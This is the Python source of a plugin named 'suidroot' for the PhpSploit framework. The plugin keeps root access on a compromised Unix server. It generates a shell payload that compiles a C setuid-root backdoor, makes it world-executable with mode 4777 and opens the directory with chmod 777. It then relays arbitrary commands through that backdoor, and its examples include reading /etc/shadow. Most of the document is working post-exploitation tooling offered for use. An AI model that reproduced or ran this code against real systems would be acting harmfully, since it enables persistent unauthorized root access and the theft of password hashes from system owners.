"""Basic setuid exploit handler

SYNOPSIS:
    suidroot generate <FILE>
    suidroot "<COMMAND>"

DESCRIPTION:
    Create an setuid byte infected file from a temporary
    obtained access as privileged user by executing a one line
    shell payload, to send privileged commands from this
    PhpSploit plugin.
    In order to enable this plugin, you must have a way to
    execute something as a privileged user. This plugin do not
    handles any exploit, it just permits you to keep an
    obtained privileged access on a remote unix based system.
    - When you got some access, use the 'generate' command
    to choose the remote file path you want to use as setuid
    privilege handler. Next, execute AS THE PRIVILEGED USER
    the plugin generated shell payload, and then answer 'y'
    to the execution confirmation query, which will check if
    the payload has been correctly executed.
    - One the steps above are done, you can enjoy your
    privileged access by using the suidroot <some-command>"
    syntax.

    NOTE: Since this plugin uses the unix's setuid feature as
    tunnel, it is obsolete on other platforms like Windows.

WARNING:
    Considering the PhpSploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > suidroot generate /var/tmp/setuid-priv.bin
      - Generate a payload to execute privileged, using the
        given file path as execution tunnel
    > suidroot cat /tmp/shadow
      - Print the /etc/shadow data as privileged user
    > suidroot "whoami; id"
      - Show your current user and id (enjoy!)

ENVIRONMENT:
    * SUIDROOT_BACKDOOR
        The exploit file with setuid byte
    * SUIDROOT_PIPE
        The SUIDROOT_BACKDOOR's command repsonse recipient
    * SUIDROOT_CWD
        The current working directory as privileged user

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

# enable plugin use with the 'shell' command
api.isshell()

# fail if the remote server is a Windows platform
if api.server['platform'] == 'win':
    api.exit(P_err+self.name+': Only available on unix systems')

# at least 1 argument must be given
if self.argc < 2:
    api.exit(self.help)

# on suidroot handle generation
if self.argv[1] == 'generate':
    # at least 2 argument must be given in this case
    if self.argc != 3:
        api.exit(self.help)

    # the 3rd argument determines the setuid file to use
    suidFile = rpath.abspath(self.argv[2])
    suidDir = rpath.dirname(suidFile)

    # generate the payload that must be run as privileged user, it will
    # create the wanted file with suid byte, making tunnel available.
    pipe = suidDir+'/.x.x.x'
    backdoor = 'main(){setuid(0);system("%s");}' %pipe
    payload = ("chmod 777 %d;echo -e '%b'>%f;gcc -x c"
               " -o %f %f;chown root %f;chmod 4777 %f")
    payload = payload.replace('%b',backdoor)
    payload = payload.replace('%f',suidFile)
    payload = payload.replace('%d',suidDir)

    # once generated, ask the user to execute the payload as privileged user
    print('To activate the suidroot backdoor, execute '
          'this payload AS ROOT on the remote system:')
    print(P_NL+color(34)+payload+color(0)+P_NL)

    # wait for positive responce before creating the env var
    if not reply.isyes('Was the payload executed ?'):
        api.exit(P_err+self.name+': Payload generation aborted')

    # send the checker.php payload with BACKDOOR value
    http.send( {'BACKDOOR': suidFile}, 'checker')
    if http.error:
        # exit if the suid file was not correctly set
        api.exit( P_err+'%s: %s: Is not a valid suidroot backdoor' \
                      %(self.name, suidFile) )

    # if the env do not exist, create it empty
    if 'SUIDROOT_BACKDOOR' not in api.env:
        api.env['SUIDROOT_BACKDOOR'] = ''

    # build the env var value
    if suidFile != api.env['SUIDROOT_BACKDOOR']:
        try:
            del api.env['SUIDROOT_BACKDOOR']
        except:
            pass
        api.env['SUIDROOT_BACKDOOR'] = suidFile
        api.env['SUIDROOT_CWD']      = rpath.cwd
        api.env['SUIDROOT_PIPE']     = pipe

    api.exit(P_inf+'The suidroot exploit is now available !')


# On classic command pass, make sure the exploit is activated
if not 'SUIDROOT_BACKDOOR' in api.env:
    api.exit(P_err+"Suidroot exploit not activated,"
             " use the 'generate' argument")

# build the command to send from given arguments
command = 'cd '+api.env['SUIDROOT_CWD']+'\n' # goto exploit current dir
command += (' '.join(self.argv[1:]))+'\n' # the joined user arguments
command += 'echo suid `pwd` suid\n' # parser to make sure new pwd is known

# build the query dict and sent it through payload.php
query = {'BACKDOOR' : api.env['SUIDROOT_BACKDOOR'],
         'PIPE'     : api.env['SUIDROOT_PIPE'],
         'COMMAND'  : command}
http.send(query)

# exit with errors if any
if http.error:
    api.exit(http.error)

# split response lines, and return empty if no data
response = http.response.splitlines()
if not response:
    api.exit('')

newpwd = response[-1] # get new pwd if it has changed (last output line)
response = P_NL.join(response[:-1]) # the rest is the given command's response

# check if new pwd command has been executed, then unparse
# it and set it as new SUIDROOT_CWD environment value.
err = P_err+self.name+': Fatal error'
if not newpwd.startswith('suid '):
    api.exit(err)
if not newpwd.endswith('suid'):
    api.exit(err)
newpwd = newpwd[5:-5]
if not rpath.isabs(newpwd):
    api.exit(err)
api.env['SUIDROOT_CWD'] = newpwd

# finaly, print the command response
print(response)
